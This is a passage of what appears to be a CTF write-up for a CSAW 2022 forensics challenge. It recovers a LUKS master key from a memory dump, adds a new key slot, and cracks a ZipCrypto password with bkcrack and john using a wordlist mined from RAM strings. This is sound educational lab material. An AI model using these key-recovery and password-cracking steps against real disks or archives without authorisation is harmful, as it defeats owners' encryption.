 </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Linux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class=\"comment\">#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)</span></span><br></pre></td></tr></table></figure>\n<p>Bingo!! Our profile is ready to work! Let’s start the investigation now<br>\nI started checking the bash history!</p>\n<figure class=\"highlight bash\"><figcaption><span>Bash History</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_bash        </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Pid      Name       Command Time             Command</span><br><span class=\"line\">-------- ---------- -----------------------  -------</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  <span class=\"built_in\">history</span></span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  apt-get install linux-image-4.4.0-72-lowlatency linux-headers-lowlatency</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  reboot</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  apt-get insta</span><br><span class=\"line\">    1229 bash       2017-04-14 07:59:07 UTC  <span class=\"built_in\">history</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:04:44 UTC  apt-get install lynx gnupg</span><br><span class=\"line\">    1229 bash       2017-05-05 12:06:54 UTC  nano /etc/fstab</span><br><span class=\"line\">    1229 bash       2017-05-05 12:06:58 UTC  nano /etc/crypttab</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:08 UTC  <span class=\"built_in\">cd</span> /mnt/</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:29 UTC  <span class=\"built_in\">cp</span> -R /media/sf_DUMP/dir* .</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:38 UTC  ping 8.8.8.8</span><br><span class=\"line\">    1229 bash       2017-05-05 12:09:14 UTC  gpg --quick-gen-key <span class=\"string\">&#x27;Troll &lt;abuse@nothere.com&gt;&#x27;</span> rsa4096 cert 1y</span><br><span class=\"line\">    1229 bash       2017-05-05 12:09:49 UTC  lynx -accept_all_cookies <span class=\"string\">&quot;https://www.google.com/?=password+porno+collection&quot;</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:10:27 UTC  gpg --<span class=\"built_in\">yes</span> --batch --passphrase=1m_4n_4dul7_n0w -c findme.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:10:37 UTC  lynx -accept_all_cookies <span class=\"string\">&quot;https://www.google.com/?=password+troll+memes&quot;</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:04 UTC  gpg --<span class=\"built_in\">yes</span> --batch --passphrase=Troll_Tr0ll_TrOll -c end.zip</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:20 UTC  nano dir1/dic_fr_l33t.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:28 UTC  <span class=\"built_in\">rm</span> findme.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:35 UTC  <span class=\"built_in\">rm</span> -rf dir1/</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:55 UTC  <span class=\"built_in\">dd</span> <span class=\"keyword\">if</span>=/dev/sdb of=/media/sf_DUMP/forensic.img bs=2048</span><br></pre></td></tr></table></figure>\n<p>Let’s analyse this history together to understand what is going on here!</p>\n<ul>\n<li>The user install low-latency kernel</li>\n<li>install lynx : a terminal-based web browser for all Linux distributions</li>\n<li>edit the /etc/fstab.</li>\n<li>edit /etc/crypttab</li>\n<li>copy the directories from media (it can be a flash) partition to  <code>/mnt/</code></li>\n<li>Check the connectivity by pinging the DNS server of google (I used to do the same test :3)</li>\n<li>generate a key with gpg using rsa4096. Something will be encrypted in the next commands! I am sure</li>\n<li>use lynx to search for porno password collection! mmm He want a premium account</li>\n<li>Encrypt  <code>findme.txt</code>  file using gpg !! This will generate an encrypted file  <code>findme.txt.gpg</code></li>\n<li>Search for troll password!</li>\n<li>Encrypt  <code>end.zip</code>  with gpg again! We have  <code>end.zip.gpg</code> , another encrypted file!</li>\n<li>edit a file text called  <code>dic_fr_l33t.txt</code></li>\n<li>remove  <code>findme.txt</code> . I guess we need to recover this file !</li>\n<li>remove the directory that contains the  <code>dic_fr_l33t.txt</code>  file</li>\n</ul>\n<blockquote>\n<p>/etc/fstab: is a configuration table designed to ease the burden of mounting and unmounting file systems to a machine. It is a set of rules used to control how different filesystems are treated each time they are introduced to a system</p>\n</blockquote>\n<blockquote>\n<p>The /etc/crypttab (encrypted device table) file is similar to the fstab file and contains a list of encrypted devices to be unlocked during system boot up. This file can be used for automatically mounting encrypted swap devices or secondary file systems.</p>\n</blockquote>\n<p>Ok the encrypted disk contains a  <code>end.zip.gpg</code>  and  <code>findme.text.gpg</code> . These 2 files are the key of the task! The flag is on these files! So we need to decrypt to disk and mount it!</p>\n<h2 id=\"decrypt-disk-and-mount-it\"><a class=\"markdownIt-Anchor\" href=\"#decrypt-disk-and-mount-it\">#</a> Decrypt Disk and MOUNT IT</h2>\n<p>Dealing with the disk we require  <code>cryptsetup</code>  --a tool to manage plain dm-crypt and LUKS encrypted volumes, to install it, use  <code>sudo apt install cryptsetup-bin</code> .</p>\n<p>Analyzing the disk image to understand what we need to next!</p>\n<p>command  <code>cryptsetup luksDump forensic.img</code>  will return some useful LUKS information:</p>\n<figure class=\"highlight bash\"><figcaption><span>LUKS INFO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LUKS header information <span class=\"keyword\">for</span> forensic.img</span><br><span class=\"line\"></span><br><span class=\"line\">Version:        1</span><br><span class=\"line\">Cipher name:    aes</span><br><span class=\"line\">Cipher mode:    ecb</span><br><span class=\"line\">Hash spec:      sha1</span><br><span class=\"line\">Payload offset: 2048</span><br><span class=\"line\">MK bits:        128</span><br><span class=\"line\">MK digest:      a0 0c 4d c4 4a 53 5c 00 0c c3 33 63 13 5b 2c 41 8e a3 3f a9</span><br><span class=\"line\">MK salt:        5e 84 10 01 a8 19 06 22 6a 7b 1b <span class=\"built_in\">df</span> 35 73 46 8e</span><br><span class=\"line\">                0e 7e f4 68 b0 97 38 81 cf 6d 99 7c 22 82 bd 06</span><br><span class=\"line\">MK iterations:  117625</span><br><span class=\"line\">UUID:           61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe</span><br><span class=\"line\"></span><br><span class=\"line\">Key Slot 0: ENABLED</span><br><span class=\"line\">        Iterations:             507935</span><br><span class=\"line\">        Salt:                   68 5e 9a ef 39 26 3a 09 3a a2 57 fa b8 a4 d9 6b</span><br><span class=\"line\">                                65 81 49 63 d7 43 41 2a 0e 0a <span class=\"built_in\">cd</span> cb d7 94 ac 01</span><br><span class=\"line\">        Key material offset:    8</span><br><span class=\"line\">        AF stripes:             4000</span><br><span class=\"line\">Key Slot 1: DISABLED</span><br><span class=\"line\">Key Slot 2: DISABLED</span><br><span class=\"line\">Key Slot 3: DISABLED</span><br><span class=\"line\">Key Slot 4: DISABLED</span><br><span class=\"line\">Key Slot 5: DISABLED</span><br><span class=\"line\">Key Slot 6: DISABLED</span><br><span class=\"line\">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure>\n<p>It is clear as day that once we have the master key --the one used to control the disk the way we want, we can add a key slot/passphrase.</p>\n<p>As said in the introduction, the master key must be loaded into the RAM, we know it is AES, so using  <code>findaes</code>  tool <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdHMvZmluZGFlcy8=\">here</span></p>\n<p>Then, extract the downloaded zip file<br>\n <code>unzip findaes*.zip</code> <br>\nCompile it<br>\n <code>cd findaes* ; make</code> <br>\nAnd run it against the memory dump<br>\n <code>./findaes memory.raw</code> <br>\nAnd you get this!</p>\n<figure class=\"highlight bash\"><figcaption><span>AES Finally !</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Found AES-128 key schedule at offset 0xad9f450:</span><br><span class=\"line\">8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1</span><br></pre></td></tr></table></figure>\n<p>Going further is a routinuous disk encryption operation, with the masterkey in hand, we can generate a new passphrase say  <code>1234</code>  or  <code>p@ssw0rd</code>  for us to access the content.</p>\n<figure class=\"highlight bash\"><figcaption><span>MasterKey !</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1&quot;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&quot; &quot;</span> | xxd -r -p  &gt; masterkey.key</span><br><span class=\"line\"></span><br><span class=\"line\">cryptsetup luksAddKey --master-key-file=masterkey.key forensic.img                               </span><br><span class=\"line\">Enter new passphrase <span class=\"keyword\">for</span> key slot:</span><br><span class=\"line\">Verify passphrase:</span><br></pre></td></tr></table></figure>\n<p>Let’s see if it is now placed as Key Slot 1!</p>\n<figure class=\"highlight bash\"><figcaption><span>LUKS</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cryptsetup luksDump forensic.img | grep Key.Slot</span><br><span class=\"line\">Key Slot 0: ENABLED</span><br><span class=\"line\">Key Slot 1: ENABLED</span><br><span class=\"line\">Key Slot 2: DISABLED</span><br><span class=\"line\">Key Slot 3: DISABLED</span><br><span class=\"line\">Key Slot 4: DISABLED</span><br><span class=\"line\">Key Slot 5: DISABLED</span><br><span class=\"line\">Key Slot 6: DISABLED</span><br><span class=\"line\">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure>\n<p>All good!<br>\nNow, we mount it!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cryptosetup luksOpen forensic.img mydata</span><br><span class=\"line\">Enter passphrase for forensic.img: </span><br><span class=\"line\">mkdir ~/csaw</span><br><span class=\"line\">sudo mount /dev/mapper/mydata ~/csaw</span><br></pre></td></tr></table></figure>\n<p>Just fill in your new passphrase in the previous step, and you’ll have it!</p>\n<p>If you got some permission concern while trying to access the mount point, just switch to root!</p>\n<p>After decrypting the disk and mounting it! We find 2 directories!  <code>dir2</code>  and  <code>lost+found</code> . OK I can say skip &amp; ignore  <code>lost+found</code>  directory. The  <code>dir2</code>  is our target. Let’s get our flag man!</p>\n<figure class=\"highlight bash\"><figcaption><span>test</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">ls</span> </span><br><span class=\"line\">end.png    findme.txt.gpg      readme.txt</span><br></pre></td></tr></table></figure>\n<p>Let’s check the readme.txt first, Just i am trying to be patient before attacking the  <code>findme.txt.gpg</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Check readme</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">cat</span> readme.txt</span><br><span class=\"line\">Do you know GPG? So just <span class=\"keyword\">do</span> it to decipher!!!</span><br></pre></td></tr></table></figure>\n<p>Ah man! We know that! We need to decrypt the gpg files. But wait! where is the  <code>end.zip.gpg</code>  file!<br>\nOk it’s not important for me! I guess  <code>findme.txt.gpg</code>  is the flag! Let’s decipher it with  <code>gpg</code>  command line utility. Of course we will use  <code>1m_4n_4dul7_n0w</code>  password!</p>\n<figure class=\"highlight bash\"><figcaption><span>test</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output findme.txt --decrypt findme.txt.gpg <span class=\"comment\"># it will ask you for a password</span></span><br><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">cat</span> findme.txt</span><br><span class=\"line\">The flag is not here of course !!!</span><br><span class=\"line\">You must find it :-)</span><br><span class=\"line\">Troll one day troll always ........</span><br></pre></td></tr></table></figure>\n<p>Ah man ! I don’t find the flag! OK still the  <code>end.zip.gpg</code> ! Let’s find this, i guess it’s hiding in  <code>end.png</code>  image</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ sudo binwalk end.png </span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             PNG image, 850 x 300, 8-bit/color RGB, non-interlaced</span><br><span class=\"line\">320           0x140           Zlib compressed data, best compression</span><br><span class=\"line\">917           0x395           Zlib compressed data, best compression</span><br><span class=\"line\">493886        0x7893E         Zip archive data, at least v2.0 to extract, compressed size: 61917, uncompressed size: 61907, name: end.zip.gpg</span><br><span class=\"line\">555953        0x87BB1         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>\n<p>Finally we found it, let’s use  <code>foremost</code>  command to extract our target !</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ foremost end.png   </span><br><span class=\"line\">Processing: end.png</span><br><span class=\"line\">|foundat=end.zip.gpgUT</span><br><span class=\"line\">*|</span><br></pre></td></tr></table></figure>\n<p>A new directory called  <code>output</code>  is created and it contains the extracted files from  <code>end.png</code>  using</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ tree output</span><br><span class=\"line\">output</span><br><span class=\"line\">├── audit.txt</span><br><span class=\"line\">├── png</span><br><span class=\"line\">│   └── 00000000.png</span><br><span class=\"line\">└── zip</span><br><span class=\"line\">    └── 00000964.zip</span><br><span class=\"line\"></span><br><span class=\"line\">2 directories, 3 files</span><br></pre></td></tr></table></figure>\n<p>OK let’s unzip the  <code>00000964.zip</code>  file and decipher the  <code>end.zip.gpg</code>  file using  <code>Troll_Tr0ll_TrOll</code>  password and get our flag</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ unzip output/zip/00000964.zip </span><br><span class=\"line\">Archive:  output/zip/00000964.zip</span><br><span class=\"line\">  inflating: end.zip.gpg</span><br><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output end.zip --decrypt end.zip.gpg</span><br></pre></td></tr></table></figure>\n<p>Ah finally there is a flag.gif file in end.zip file but wait!! the zip file is protected!</p>\n<p>We’ve noticed that the encryption is ZipCrypto Deflate which is similar to the other chall, crackable by just knowing 12 bytes of whats inside the zip, 8 of which must be contiguous.<br>\nWe’ve went ahead, used the header of a GIF file, and digging more into the GIF file structure, we’ve came to know that in most of the GIF files there is a constant text ‘NETSCAPE’ at the hexadecimal offset 0x310 which fulfills our needs, 8 bytes contiguous plus the header, we’ve got more than 12 bytes.</p>\n<p>The header is just  <code>GIF89a</code>  at offset 0x0.</p>\n<p><img data-src=\"https://i.imgur.com/RH9goSf.png\" alt=\"\"></p>\n<p>You can get bkcrack from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tpbWNpODYvYmtjcmFjaw==\">here</span></p>\n<p>-C to specify the ciphered zip, -c for the target file -x to specify known bytes at some offset and -d to get the deciphered data once the process is done, and keys were found!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./bkcrack -C end.zip -c flag.gif -x 0 474946383961 -x 0x310 4E4554534415045322E30 -d deciphered</span><br></pre></td></tr></table></figure>\n<p>Unfortunately, it ended with  <code>Could Not find the keys.</code></p>\n<p>However we were not lucky to crack the zip open using bkcrack again.</p>\n<p>Don’t worry dude! we have rockyou and john! Let’s give bruteforcing a chance. We can extract the password hash with  <code>zip2john</code>  command!</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ zip2john end.zip &gt; zip.hash  </span><br><span class=\"line\">ver 2.0 efh 5455 efh 7875 end.zip/flag.gif PKZIP Encr: TS_chk, cmplen=61563, decmplen=90082, crc=18A1C7A3 ts=8050 cs=8050 <span class=\"built_in\">type</span>=8</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to bruteforce the hash with rockyou!</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ john --wordlist=<span class=\"variable\">$rockyou</span> zip.hash</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password <span class=\"built_in\">hash</span> (PKZIP [32/64])</span><br><span class=\"line\">No password hashes left to crack (see FAQ)</span><br></pre></td></tr></table></figure>\n<p>Wait what??? The password wasn’t found on rockyou! What the hack?? After some investigating we remember that there is a text file called  <code>dic_fr_l33t.txt</code> ! dic means dictionary and fr means french right ? Oh man we need to recover this wordlist! But the user deleted it. I’ll give a chance to  <code>linux_find_file</code> . Let’s try to dump this text file. It might be stil loaded in the memory right?</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -L | grep dic_fr</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">3 0xffff88000c135cd8 /media/sf_DUMP/dir1/dic_fr_l33t.txt</span><br><span class=\"line\">vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -i 0xffff88000c135cd8 -O dic_fr_l33t.txt</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br></pre></td></tr></table></figure>\n<p>Ah God! The extracted file is empty. We need another way to recover the wordlist and with an elegent way<br>\nAfter some minutes of thinking. We decide to use a regex that allow us to collect words that not contains special chars like  <code>&#123;_;&#125;/][-</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ strings memory.raw | grep -v <span class=\"string\">&quot; \\|\\_\\|\\-\\|\\[\\|\\]\\|\\`\\|\\;\\|\\/\\|\\.\\|\\&#125;\\|\\&#123;&quot;</span> | <span class=\"built_in\">sort</span> | <span class=\"built_in\">uniq</span> | <span class=\"built_in\">sort</span> &gt; myrock.txt</span><br><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ sudo john --wordlist=~/myrock.txt zip.hash</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password <span class=\"built_in\">hash</span> (PKZIP [32/64])</span><br><span class=\"line\">Will run 8 OpenMP threads</span><br><span class=\"line\">Press <span class=\"string\">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class=\"keyword\">for</span> status</span><br><span class=\"line\">Cyb3rs3curit3    (end.zip/flag.gif)</span><br><span class=\"line\">1g 0:00:00:00 DONE (2022-09-12 20:34) 6.666g/s 655360p/s 655360c/s 655360C/s Coup3ri3z..D3fouraillions</span><br><span class=\"line\">Use the <span class=\"string\">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n<p>Oh man we did it! The password of the protected  <code>end.zip</code>  is  <code>Cyb3rs3curit3</code>  (CyberSecurité).Let’s extract the  <code>flag.gif</code>  file now…</p>\n<p><img data-src=\"https://imgur.com/jZoDJhE.gif\" alt=\"\"><br>\nLet’s convert this gif to frames using  <code>ffmpeg</code>  utility, the magical one xD</p>\n<figure class=\"highlight bash\"><figcaption><span>Split the gif</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ <span class=\"built_in\">mkdir</span> temp ; ffmpeg -i /mnt/dir2/flag.gif -vsync 0 temp/temp%d.png</span><br><span class=\"line\">Input <span class=\"comment\">#0, gif, from &#x27;flag.gif&#x27;:</span></span><br><span class=\"line\">  Duration: 00:00:03.60, start: 0.000000, bitrate: 200 kb/s</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0: Video: gif, bgra, 290x290, 10 fps, 10 tbr, 100 tbn</span></span><br><span class=\"line\">Stream mapping:</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0 -&gt; #0:0 (gif (native) -&gt; png (native))</span></span><br><span class=\"line\">Press [q] to stop, [?] <span class=\"keyword\">for</span> <span class=\"built_in\">help</span></span><br><span class=\"line\">Output <span class=\"comment\">#0, image2, to &#x27;temp/temp%d.png&#x27;:</span></span><br><span class=\"line\">  Metadata:</span><br><span class=\"line\">    encoder         : Lavf59.27.100</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0: Video: png, rgba(pc, gbr/unknown/unknown, progressive), 290x290, q=2-31, 200 kb/s, 10 fps, 10 tbn</span></span><br><span class=\"line\">    Metadata:</span><br><span class=\"line\">      encoder         : Lavc59.37.100 png</span><br><span class=\"line\">frame=   36 fps=0.0 q=-0.0 Lsize=N/A time=00:00:03.60 bitrate=N/A speed=14.8x</span><br><span class=\"line\">video:113kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: unknown</span><br></pre></td></tr></table></figure>\n<p>We got this images! oh we have 36 QR Code images! Seriously i don’t want to scan it manually!<br>\n<img data-src=\"https://imgur.com/aFiEzTR.png\" alt=\"\"><br>\nLet’s Write a small code that reads all these QRcode images! I am too lazy man !</p>\n<figure class=\"highlight python\"><figcaption><span>Scan QRCode</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> cv2</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">36</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    img=cv2.imread(<span class=\"string\">&quot;temp&quot;</span>+<span class=\"built_in\">str</span>(i+<span class=\"number\">1</span>)+<span class=\"string\">&quot;.png&quot;</span>)</span><br><span class=\"line\">    det=cv2.QRCodeDetector()</span><br><span class=\"line\">    val, pts, st_code=det.detectAndDecode(img)</span><br><span class=\"line\">    flag+=val[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>Let’s run the code now ! I wish this nightmare finish dude! I don’t another step please</p>\n<figure class=\"highlight bash\"><figcaption><span>Run Reader</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ python3 temp/solve.py</span><br><span class=\"line\">The_flag_is:1_Lik3_F0r3nS1c_4nd_y0u?</span><br></pre></td></tr></table></figure>\n<p>And Finally we got the flag!</p>\n<h1 id=\"quantum-leap-misc\"><a class=\"markdownIt-Anchor\" href=\"#quantum-leap-misc\">#</a> Quantum Leap : Misc</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>My friend took the quantum leap and purchased a quantum computer with two qubits. They mentioned using a quantum logic gate to input the flag and they gave me the computers output. I have been stuck and Can NOT figure out the flag.</p>\n</div></details>\n<p>Challenge Link &amp; WriteUp Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhbmlhTWlkYW91aS9DVEYtd3JpdGV1cHMvYmxvYi9tYWluL0NTQVcyMi9RdWFudHVtJTIwTGVhcC9vdXRwdXQudHh0\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhbmlhTWlkYW91aS9DVEYtd3JpdGV1cHMvYmxvYi9tYWluL0NTQVcyMi9RdWFudHVtJTIwTGVhcC9vdXRwdXQudHh0\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Quantum Leap</p>\n          </div></div><div class=\"item\" title=\"Writeup Author - Mida0ui\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" 